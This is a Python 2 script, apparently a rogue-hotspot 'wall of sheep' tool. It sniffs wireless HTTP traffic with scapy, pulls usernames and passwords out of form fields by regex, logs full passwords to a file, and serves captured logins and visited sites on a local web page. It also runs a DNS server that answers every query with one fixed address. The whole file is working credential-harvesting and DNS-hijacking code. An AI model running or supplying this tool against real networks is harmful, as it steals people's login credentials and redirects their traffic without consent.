import threading
import datetime
import re
import json

from scapy.all import *
from scapy.layers.l2 import *

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer

from dnslib.server import DNSLogger, DNSServer
from dnslib.fixedresolver import FixedResolver

resolver = FixedResolver(". 60 IN A 10.15.0.9")
logger = DNSLogger(prefix=False)
server = DNSServer(resolver,port=53,address='',logger=logger)


urls = []
logins = []
log = open('log', 'a')

def match_password(payload):
    result = []

    for match in ['pass', 'pwd', 'password', 'haslo']:
        pwd = re.search('%s=([a-zA-Z0-9.-]*)' % match, str(payload))

        if pwd:
            log.write("Password: %s" % pwd.group(1))
            pas = pwd.group(1)
            pas = pas[:2] + '*' * (len(pas) - 2)
            result.append("Password: %s" % pas)
    return result


def match_email(payload):
    result = []

    for match in ['email', 'login', 'username', 'user', 'name']:
        login = re.search('%s=([a-zA-Z0-9.-]*)' % match, str(payload))

        if login:
            log.write("Login: %s" % login.group(1))
            result.append("Login: %s" % login.group(1))
    return result


def match_dns(payload):
    result = []
    host = re.search('Host: ([a-zA-Z0-9.-]*)\r\n', str(payload))

    if host:
        result.append("Site: " + host.group(1))
        log.write("Site: " + host.group(1))
    return result


def annotate(ip, l):
     result = []
     for item in l:
         result.append('[%s] [%s] %s' % (datetime.datetime.now().strftime('%H:%M:%S'), ip, item))
     return result


def pkt_callback(pkt):
    tcp = pkt.getlayer('TCP')
    ip = pkt.getlayer('IP')

    if ip and tcp:
               if tcp.dport == 80 and ip.src != '127.0.0.1':
                   global urls
                   global logins
                   urls = annotate(ip.src, match_dns(tcp.payload)) + urls

                   logins = annotate(ip.src, match_email(tcp.payload)) + logins
                   logins = annotate(ip.src, match_password(tcp.payload)) + logins

                   if len(urls) > 100: 
                       urls = urls[:100]
                   if len(logins) > 100: 
                       logins = logins[:100]
                   print "80 tcp", urls, logins


class HTTPHandler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        if self.path == '/':
           with open('index.html') as f:
                self.wfile.write(f.read())
        elif self.path == '/jquery.js':
           with open('jquery.js') as f:
                self.wfile.write(f.read())
        elif self.path == '/urls':
           self.wfile.write(json.dumps(list(reversed(sorted(list(set(urls)))))))
        elif self.path == '/logins':
           self.wfile.write(json.dumps(list(reversed(sorted(list(set(logins)))))))
        else:
           print "error", self.path

    def do_HEAD(self):
        self._set_headers()


def run():
    server_address = ('0.0.0.0', 9000)
    httpd = HTTPServer(server_address, HTTPHandler)
    print 'Starting httpd...'
    httpd.serve_forever()

http_thread = threading.Thread(target=run)
http_thread.daemon=False
http_thread.start()

sniff(iface="mon0", prn=pkt_callback, store=0)
